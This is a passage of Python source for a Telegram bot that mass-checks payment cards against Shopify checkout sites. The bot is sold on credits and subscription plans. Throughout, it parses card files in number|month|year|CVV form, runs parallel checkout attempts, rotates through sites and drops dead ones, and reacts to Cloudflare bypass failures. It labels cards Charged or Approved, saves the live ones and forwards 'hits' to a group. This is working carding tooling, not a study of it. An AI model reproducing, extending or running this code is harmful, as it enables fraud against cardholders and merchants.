        ACTIVE_MSH_PROCESSES.pop(user_id, None)

async def process_individual_result(event, card, result, response_time, site, site_index):
    """Process individual card result with timing info"""
    try:
        if isinstance(result, Exception):
            result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

        elapsed_time = round(response_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        response_text = result.get("Response", "").lower()
        
        # Handle r4 token empty error
        if "r4 token empty" in response_text or "r4 token is empty" in response_text:
            result["Response"] = "INCORRECT_NUMBER"
            response_text = "incorrect_number"
        
        if "cloudflare bypass failed" in response_text:
            status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
            result["Response"] = "Cloudflare spotted 🤡 change site or try again"
        elif "thank you" in response_text or "payment successful" in response_text:
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            status_result = "Charged"
            await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
            # Forward to Hits Group (Thank you responses)
            await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_index + 1, event.sender_id, "msh")
        elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_result = "Approved"
            await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            # Forward to Hits Group only for INCORRECT_ZIP responses
            if "incorrect_zip" in response_text:
                await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_index + 1, event.sender_id, "msh")
        else:
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            status_result = "Declined"
        
        # Determine status text
        if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status_header:
            status_display = "`Charged 💎`"
        elif "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status_header:
            status_display = "APPROVED ✅"
        elif "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀" in status_header:
            status_display = "CLOUDFLARE ⚠️"
        else:
            status_display = "Failed ❌"
        
        # Clean format with bold labels
        card_msg = f"""```
✦ [$msh] [ #Auto_Shopify ]
```
**CC**: `{card}`
**Status**: {status_display}
**Response**: {result.get('Response')}
**Price** → {result.get('Price')} 💸
**Site** → {site_index + 1}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {flag}

Elapsed time: {elapsed_time} seconds"""
        result_msg = await event.reply(card_msg, parse_mode='Markdown', link_preview=False)
        if "thank you" in response_text or "payment successful" in response_text: 
            await pin_charged_message(event, result_msg)
        await asyncio.sleep(0.1)
    except Exception as e:
        print(f"Error processing individual result: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt$'))
@require_membership
async def mtxt(event):
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("mtxt"):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    print(f"[MTXT] can_access={can_access}, access_type={access_type}")
    if access_type == "banned": return await event.reply(banned_user_message(), link_preview=False)
    if not can_access:
        print(f"[MTXT] ❌ Access denied! can_access={can_access}")
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    print(f"[MTXT] ✅ Access granted! Proceeding with command...")
    
    # Check if user has Premium or VIP plan for /mtxt access (skip for authorized groups)
    user_id = event.sender_id
    if user_id not in ADMIN_ID and access_type not in ["main_group_free", "premium_group_free"]:
        user_data = await get_user_credits(user_id)
        plan = user_data.get('plan', 'Free')
        if plan not in ['Premium', 'VIP']:
            return await event.reply("❌ **Premium/VIP Plan Required!**\n\n/mtxt command requires Premium or VIP plan.\n\n💎 Contact [𝘼𝙆](https://t.me/Akbhai007) to upgrade your plan!", link_preview=False)
    if user_id in ACTIVE_MTXT_PROCESSES: return await event.reply("```𝙔𝙤𝙪𝙧 𝙘𝙖𝙧𝙙 𝙞𝙨 𝙘𝙤𝙤𝙠𝙞𝙣𝙜! 𝙋𝙡𝙚𝙖𝙨𝙚 𝙝𝙤𝙡𝙙 𝙤𝙣...```", link_preview=False)
    try:
        if not event.reply_to_msg_id: return await event.reply("❌ Please reply to a document message with /mtxt", link_preview=False)
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: return await event.reply("❌ Please reply to a document message with /mtxt", link_preview=False)
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try: os.remove(file_path)
            except: pass
            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}", link_preview=False)
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards: return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲", link_preview=False)
        cc_limit = get_mtxt_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙 ✅```""", link_preview=False)
        else: 
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙 ✅```""", link_preview=False)
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        if not user_sites: return await event.reply("𝙎𝙞𝙩𝙚 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 𝙄𝙣 𝙔𝙤𝙪𝙧 𝘿𝙗", link_preview=False)
        
        # Check if user has enough credits (skip for admin)
        if user_id not in ADMIN_ID:
            user_data = await get_user_credits(user_id)
            available_credits = user_data.get('credits', 0)
            required_credits = len(cards)
            plan = user_data.get('plan', 'Free')
            
            if available_credits < required_credits:
                # Free plan users ko Premium/VIP required message dikhao
                if plan == 'Free':
                    return await event.reply(
                        "❌ **Premium/VIP Plan Required!**\n\n/mtxt command requires Premium or VIP plan.\n\n💎 Contact [𝘼𝙆](https://t.me/Akbhai007) to upgrade your plan!"
                    , link_preview=False)
                else:
                    # Premium/VIP users ko insufficient credits message dikhao
                    buttons = [[Button.url("💎 Buy Credits", "https://t.me/Akbhai007")]]
                    return await event.reply(
                        f"❌ Insufficient Credits!\n\nYou need {required_credits} credits but have {available_credits}.\n\n💎 Contact [𝘼𝙆](https://t.me/Akbhai007) to buy more credits!"
                    , buttons=buttons, link_preview=False)
        
        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(process_mtxt_cards(event, cards, user_sites.copy()))
    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ Error: {e}", link_preview=False)

async def process_mtxt_cards(event, cards, local_sites):
    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    removed_sites = []  # Track removed sites
    site_dead_count = {}  # Track dead responses per site
    status_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```", link_preview=False)
    cards_per_site = 4
    current_site_index = 0
    cards_on_current_site = 0

    try:
        batch_size = 15
        for i in range(0, len(cards), batch_size):
            if not local_sites:
                await status_msg.edit("❌ **All your sites are dead!**\nPlease add fresh sites using `/add` and try again.")
                break

            batch = cards[i:i+batch_size]
            tasks = []
            task_cards = []

            if user_id not in ACTIVE_MTXT_PROCESSES:
                # Update status message to show stopped (remove buttons)
                try: await status_msg.edit("```⛔ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!```")
                except: pass
                
                # Send NEW summary message
                final_caption = f"""⛔ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
𝙍𝙚𝙢𝙤𝙫𝙚𝙙 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 🗑️ : {len(removed_sites)}"""

                
                final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙎𝙩𝙤𝙥 ➜ [{checked}/{total}] ⛔", b"none")]]
                
                try: await event.reply(final_caption, buttons=final_buttons, link_preview=False)
                except: pass
                return

            for card in batch:
                if user_id not in ACTIVE_MTXT_PROCESSES or not local_sites:
                    break
                current_site = local_sites[current_site_index]
                tasks.append(check_card_specific_site(card, current_site))
                task_cards.append((card, current_site_index))
                cards_on_current_site += 1
                if cards_on_current_site >= cards_per_site:
                    current_site_index = (current_site_index + 1) % len(local_sites)
                    cards_on_current_site = 0
            
            if not tasks: continue

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, (result, (card, site_index)) in enumerate(zip(results, task_cards)):
                if user_id not in ACTIVE_MTXT_PROCESSES: break

                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

                checked += 1
                
                # Deduct 1 credit for each CC checked (skip for admin)
                if user_id not in ADMIN_ID:
                    success, remaining = await deduct_user_credits(user_id, 1, "/mtxt", event.chat_id)
                    if not success:
                        # If credit deduction fails, stop processing
                        print(f"[MTXT] Credit deduction failed for user {user_id}, stopping...")
                        break
                
                start_time = time.time()
                end_time = time.time()
                elapsed_time = round(end_time - start_time, 2)
                
                response_text = result.get("Response", "")
                response_text_lower = response_text.lower()
                
                # Fix IndexError by checking bounds
                if site_index >= len(local_sites):
                    site_index = 0
                site_used = local_sites[site_index]

                if is_site_dead(response_text):
                    declined += 1
                    if site_used in local_sites:
                        # Check if it's cloudflare - remove immediately
                        if "cloudflare bypass failed" in response_text_lower:
                            # Remove cloudflare sites immediately
                            removed_sites.append(site_used)
                            print(f"🗑️ REMOVED CLOUDFLARE SITE: {site_used} (Response: {response_text[:50]}...)")
                            
                            local_sites.remove(site_used)
                            all_sites_data = await load_json(SITE_FILE)
                            if str(user_id) in all_sites_data and site_used in all_sites_data[str(user_id)]:
                                all_sites_data[str(user_id)].remove(site_used)
                                await save_json(SITE_FILE, all_sites_data)
                            current_site_index = 0
                            cards_on_current_site = 0
                        else:
                            # For other dead sites, count dead responses
                            if site_used not in site_dead_count:
                                site_dead_count[site_used] = 0
                            site_dead_count[site_used] += 1
                            
                            print(f"⚠️ DEAD RESPONSE #{site_dead_count[site_used]} for {site_used}: {response_text[:50]}...")
                            
                            # Remove site only after 3 dead responses
                            if site_dead_count[site_used] >= 3:
                                removed_sites.append(site_used)
                                print(f"🗑️ REMOVED DEAD SITE (3 strikes): {site_used}")
                                
                                local_sites.remove(site_used)
                                all_sites_data = await load_json(SITE_FILE)
                                if str(user_id) in all_sites_data and site_used in all_sites_data[str(user_id)]:
                                    all_sites_data[str(user_id)].remove(site_used)
                                    await save_json(SITE_FILE, all_sites_data)
                                current_site_index = 0
                                cards_on_current_site = 0
                    
                    # Check if all sites are now dead
                    if not local_sites:
                        # Update status message (remove buttons)
                        try: await status_msg.edit("```⛔ 𝘼𝙡𝙡 𝙎𝙞𝙩𝙚𝙨 𝘿𝙚𝙖𝙙!```")
                        except: pass
                        
                        # Send NEW summary message
                        final_caption = f"""⛔ **All sites are dead!**
Please add fresh sites using `/add` and try again.

𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
𝙍𝙚𝙢𝙤𝙫𝙚𝙙 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 🗑️ : {len(removed_sites)}"""

                        
                        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨! ➜ [{checked}/{total}] ⛔", b"none")]]
                        
                        try: await event.reply(final_caption, buttons=final_buttons, link_preview=False)
                        except: pass
                        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
                        return
                    continue

                if "3d" in response_text_lower:
                    result["Response"] = "3DS Authentications Required"
                    declined += 1
                    continue

                # Handle r4 token empty, hcaptcha, and amount errors
                if any(err in response_text_lower for err in ["r4 token empty", "r4 token is empty", "hcaptcha detected", "hcaptcha", "del ammount empty", "del amount empty"]):
                    result["Response"] = "INCORRECT_NUMBER"
                    response_text_lower = "incorrect_number"

                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send_message = False

                if "cloudflare bypass failed" in response_text_lower:
                    status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                    result["Response"] = "Cloudflare spotted 🤡 change site or try again"
                    checked -= 1
                elif "thank you" in response_text_lower or "payment successful" in response_text_lower:
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    # Forward to Hits Group (Thank you responses)
                    await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_index + 1, user_id, "mtxt")
                    should_send_message = True
                elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    approved += 1
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    # Forward all approved cards to Hits Group
                    await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_index + 1, user_id, "mtxt")
                    should_send_message = True
                else:
                    declined += 1
                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"

                if should_send_message:
                    # Determine status text
                    if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status_header:
                        status_display = "`Charged 💎`"
                    elif "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status_header:
                        status_display = "APPROVED ✅"
                    elif "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀" in status_header:
                        status_display = "CLOUDFLARE ⚠️"
                    else:
                        status_display = "Failed ❌"
                    
                    # Clean format with bold labels
                    card_msg = f"""```✦ [$mtxt] [ #Auto_Shopify ]```
**CC**: `{card}`
**Status**: {status_display}
**Response**: {result.get('Response')}
**Price** → {result.get('Price')} 💸
**Site** → {site_index + 1}
**Gateway** → {result.get('Gateway', 'Shopify Payments')}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {flag}"""
                    result_msg = await event.reply(card_msg, link_preview=False)
                    if "thank you" in response_text_lower or "payment successful" in response_text_lower: await pin_charged_message(event, result_msg)
                
                buttons = [[Button.inline(f"𝗖𝘂𝗿𝗿𝗲𝗻𝘁 ➜ {card[:12]}****", b"none")], [Button.inline(f"𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {result.get('Response')[:25]}...", b"none")], [Button.inline(f"𝗦𝗶𝘁𝗲 ➜ {site_index + 1}", b"none")], [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")], [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")], [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_mtxt:{user_id}".encode())]]
                try: await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚... ✅```", buttons=buttons)
                except: pass
                await asyncio.sleep(0.1)

        # Update status message to show complete (remove buttons)
        try: await status_msg.edit("```✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!```")
        except: pass
        
        # Send NEW summary message
        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {total}
𝙍𝙚𝙢𝙤𝙫𝙚𝙙 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 🗑️ : {len(removed_sites)}"""

        
        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 ➜ [{total}] ☠️", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘??𝙚𝙙 ➜ [{checked}/{total}] ✅", b"none")]]
        
        try: await event.reply(final_caption, buttons=final_buttons, link_preview=False)
        except: pass
    finally: ACTIVE_MTXT_PROCESSES.pop(user_id, None)


# ===== PROXY-BASED COMMANDS =====

# /psh command removed - proxy commands no longer supported
# Proxy command removed: # @client.on(events.NewMessage(pattern=r'(?i)^[/.]psh(\s|$)'))

# Proxy command removed: @client.on(events.NewMessage(pattern=r'(?i)^[/.]pmsh(\s|$)'))

async def pmsh(event):
    """Proxy-based mass card check using ravenxchecker.site API"""
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("pmsh"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    print(f"[MSH] can_access={can_access}, access_type={access_type}")
    if access_type == "banned": return await event.reply(banned_user_message(), link_preview=False)
    if not can_access:
        print(f"[MSH] ❌ Access denied! can_access={can_access}")
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    print(f"[MSH] ✅ Access granted! Proceeding with command...")
    
    # Check if user already has an active /msh process
    if event.sender_id in ACTIVE_MSH_PROCESSES:
        return await event.reply("⏳ Wait! Your previous /msh is still checking...", link_preview=False)
    
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)
        if not cards: return await event.reply("❌ Couldn't extract valid cards from replied message\n\nFormat Example:\n/pmsh\n4111111111111111|12|2025|123\n4111111111111111|12|2025|123", link_preview=False)
    else:
        cards = extract_all_cards(event.raw_text)
    if not cards: return await event.reply("❌ Format Example:\n/pmsh\n4111111111111111|12|2025|123\n4111111111111111|12|2025|123\n4111111111111111|12|2025|123\n\nOr reply to a message containing multiple cards", link_preview=False)
    
    # Check mass checking limit for non-admin users
    if event.sender_id not in ADMIN_ID:
        if len(cards) > 15:
            return await event.reply("⚠️ Mass checking limit: 15 cards", link_preview=False)
    
    # Set limits based on user type and access level
    max_cards = get_cc_limit(access_type, event.sender_id)
    if event.sender_id in ADMIN_ID:
        limit_msg = f"{max_cards} cards for /𝙢𝙨𝙝 (Admin)"
    elif access_type in ["premium_private", "premium_group", "vip_private", "vip_group"]:
        limit_msg = f"{max_cards} cards for /𝙢𝙨𝙝 (Premium/VIP)"
    elif access_type == "group_free":
        limit_msg = f"{max_cards} cards for /𝙢𝙨𝙝 (Group Free)"
    else:
        limit_msg = f"{max_cards} cards for /𝙢𝙨𝙝"
    
    if len(cards) > max_cards and max_cards > 0:
        total_found = len(cards)
        cards = cards[:max_cards]
        await event.reply(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {max_cards} 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {total_found} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 {limit_msg}.```", link_preview=False)
    # Check if user has enough credits (skip for admin and authorized groups)
    if event.sender_id not in ADMIN_ID and access_type not in ["main_group_free", "premium_group_free"]:
        user_data = await get_user_credits(event.sender_id)
        available_credits = user_data.get('credits', 0)
        required_credits = len(cards)
        
        print(f"[MSH] Credit check: available={available_credits}, required={required_credits}")
        
        if available_credits < required_credits:
            print(f"[MSH] ❌ Insufficient credits! Blocking command.")
            return await event.reply(
                f"❌ Insufficient Credits!\n\n(Free check available in group)"
            , link_preview=False)
        
        print(f"[MSH] ✅ Sufficient credits, proceeding...")
    
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙐𝙍𝙇. 𝙁𝙞𝙧𝙨𝙩 𝙖𝙙𝙙 𝙪𝙨𝙞𝙣𝙜 /add", link_preview=False)
    
    asyncio.create_task(process_msh_cards(event, cards, user_sites))

async def process_msh_cards(event, cards, sites):
    user_id = event.sender_id
    
    # Mark process as active
    ACTIVE_MSH_PROCESSES[user_id] = True
    
    try:
        start_total_time = time.time()
        sent_msg = None
        cards_per_site = 2
        current_site_index = 0
        cards_on_current_site = 0
        
        all_results = []
        
        # Get user info for header
        try:
            user = await client.get_entity(event.sender_id)
            username = user.first_name if user.first_name else "User"
            user_username = user.username if user.username else None
            if user_username:
                user_link = f"[{username}](https://t.me/{user_username})"
            else:
                user_link = username
        except:
            username = "User"
            user_link = username
        
        # Get user plan for label
        user_data = await get_user_credits(event.sender_id)
        plan = user_data.get('plan', 'Free')
        if plan == "VIP":
            access_label = "VIP 💎"
        elif plan == "VIP":
            access_label = "VIP 💎"
        else:
            access_label = "Free 🆓"
        
        # Show loading animation and keep the message for updates
        sent_msg = await show_loading_animation(event)
        
        # Create tasks for parallel processing
        tasks = []
        task_info = []
        for idx, card in enumerate(cards):
            current_site = sites[current_site_index]
            site_idx = current_site_index
            
            task = asyncio.create_task(check_card_specific_site(card, current_site, event.sender_id))
            tasks.append(task)
            task_info.append((card, site_idx, current_site))
            
            cards_on_current_site += 1
            if cards_on_current_site >= cards_per_site:
                current_site_index = (current_site_index + 1) % len(sites)
                cards_on_current_site = 0
        
        # Process results as they complete - one by one
        completed_count = 0
        pending = {task: info for task, info in zip(tasks, task_info)}
        stopped_early = False
        
        while pending:
            done, _ = await asyncio.wait(pending.keys(), return_when=asyncio.FIRST_COMPLETED)
            
            for task in done:
                card, site_idx, site_used = pending.pop(task)
                
                try:
                    result = task.result()
                except Exception as e:
                    result = {"Response": f"Exception: {str(e)}", "Price": "-", "Gateway": "-"}
                
                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}
                
                # Get BIN info
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                
                # Clean response - remove proxy info if present
                raw_response = result.get("Response", "")
                if "@" in raw_response or re.search(r'\d+\.\d+\.\d+\.\d+:\d+', raw_response):
                    result["Response"] = "Card Declined"
                
                response_text = result.get("Response", "").lower()
                original_response = result.get("Response", "")
                
                # Handle r4 token empty, hcaptcha, and amount errors
                if any(err in response_text for err in ["r4 token empty", "r4 token is empty", "hcaptcha detected", "hcaptcha", "del ammount empty", "del amount empty"]):
                    result["Response"] = "INCORRECT_NUMBER"
                    original_response = "INCORRECT_NUMBER"
                    response_text = "incorrect_number"
                
                # Handle 3D CC responses
                if "3d" in response_text:
                    original_response = "3DS Authentications Required"
                    result["Response"] = original_response
                
                # Determine status
                if "cloudflare bypass failed" in response_text:
                    status_display = "CLOUDFLARE ⚠️"
                elif "thank you" in response_text or "payment successful" in response_text:
                    status_display = "`Charged 💎`"
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_idx + 1, event.sender_id, "mtxt")
                elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    status_display = "APPROVED ✅"
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    if "incorrect_zip" in response_text:
                        await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_idx + 1, event.sender_id, "mtxt")
                elif "3d" in response_text:
                    status_display = "Declined ❌"
                else:
                    status_display = "Declined ❌"
                
                # Store result
                all_results.append({
                    'card': card,
                    'status': status_display,
                    'response': result.get('Response'),
                    'price': result.get('Price'),
                    'site': site_idx + 1
                })
                
                completed_count += 1
                
                # Deduct 1 credit for each CC checked (skip for admin)
                if user_id not in ADMIN_ID:
                    success, remaining = await deduct_user_credits(user_id, 1, "/msh", event.chat_id)
                    if not success:
                        # If credit deduction fails, stop processing
                        print(f"[MSH] Credit deduction failed for user {user_id}, stopping...")
                        stopped_early = True
                        # Cancel remaining tasks
                        for remaining_task in pending.keys():
                            remaining_task.cancel()
                        pending.clear()
                        break
                
                # Update message with current results
                current_msg = f"```\n✦ [$msh] [ #Auto_Shopify ]\n```"
                if event.sender_id in ADMIN_ID:
                    current_msg += f"**$msh limit {len(cards)}/50** - Checked: {completed_count}/{len(cards)}\n"
                else:
                    current_msg += f"**$msh limit {len(cards)}/15** - Checked: {completed_count}/{len(cards)}\n"
                current_msg += f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
                
                for r in all_results:
                    current_msg += f"• **CC**: `{r['card']}`\n"
                    current_msg += f"• **Status**: {r['status']}\n"
                    current_msg += f"• **Result**: {r['response']}\n"
                    current_msg += f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
                
                # Add footer if all complete or stopped early
                if completed_count == len(cards) or stopped_early:
                    total_elapsed = round(time.time() - start_total_time, 2)
                    current_msg += f"**[⚬] T/t** : {total_elapsed}s\n"
                    current_msg += f"**[⚬] Checked By** : {user_link} [{access_label}]\n"
                    current_msg += f"**[⚬] Dev** : [𝘼𝙆](https://t.me/Akbhai007)"
                    if stopped_early:
                        current_msg += f"\n\n⚠️ **Stopped: Insufficient credits**"
                
                # Edit message
                try:
